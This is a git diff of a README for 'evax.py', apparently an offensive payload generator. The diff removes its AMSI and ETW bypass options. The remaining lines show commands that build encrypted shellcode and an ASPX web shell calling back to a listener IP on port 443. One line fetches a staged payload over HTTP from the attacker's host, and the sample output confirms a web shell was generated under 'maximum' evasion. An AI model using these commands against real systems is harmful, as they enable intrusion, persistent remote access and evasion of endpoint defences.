@@ -177,11 +177,6 @@ python3 evax.py -i 192.168.1.100 -p 443 -e rc4
 - Domain environment check
 - Maximum stealth
 
-```bash
-# Maximum evasion example
-python3 evax.py -i 192.168.1.100 -p 443 --evasion max --amsi --etw -e rc4
-```
-
 ---
 
 ## Advanced Options
@@ -310,7 +305,7 @@ STEP 1: RECONNAISSANCE
 
 STEP 2: GENERATE PAYLOAD
 ────────────────────────
-    python3 evax.py -i 192.168.119.120 -p 443 --evasion max --amsi -e rc4
+    python3 evax.py -i 192.168.119.120 -p 443 --evasion max 
 
     Output:
     [+] Shellcode generated! Size: 691 bytes
@@ -372,7 +367,6 @@ STEP 6: RECEIVE SESSION
 | Staged Payloads | ✅ | ❌ | ❌ |
 | Custom Shellcode | ✅ | ✅ | ❌ |
 
-**Note:** AMSI bypass is not included because ASPX shells don't need it - AMSI only monitors PowerShell/VBScript, not compiled ASPX code.
 
 ---
 
@@ -384,8 +378,6 @@ STEP 6: RECEIVE SESSION
 # Try different encryption
 python3 evax.py -i IP -p PORT -e rc4
 
-# Increase evasion level
-python3 evax.py -i IP -p PORT --evasion max --amsi --etw
 
 # Use staged payload
 python3 evax.py -i IP -p PORT --staged --url http://IP/shell.bin
@@ -449,7 +441,7 @@ sudo apt update && sudo apt install metasploit-framework -y
 ## Output Example
 
 ```
-$ python3 evax.py -i 192.168.119.120 -p 443 --evasion max --amsi -e rc4
+$ python3 evax.py -i 192.168.119.120 -p 443 --evasion max 
 
 ███████╗██╗   ██╗ █████╗ ██╗  ██╗
 ██╔════╝██║   ██║██╔══██╗╚██╗██╔╝
@@ -474,7 +466,6 @@ $ python3 evax.py -i 192.168.119.120 -p 443 --evasion max --amsi -e rc4
 [+] Shellcode generated! Size: 691 bytes
 [*] Encryption: rc4
 [*] Evasion level: max
-[*] AMSI bypass: Enabled
 [+] Web shell generated: shell.aspx
 [+] File size: 5234 bytes
 
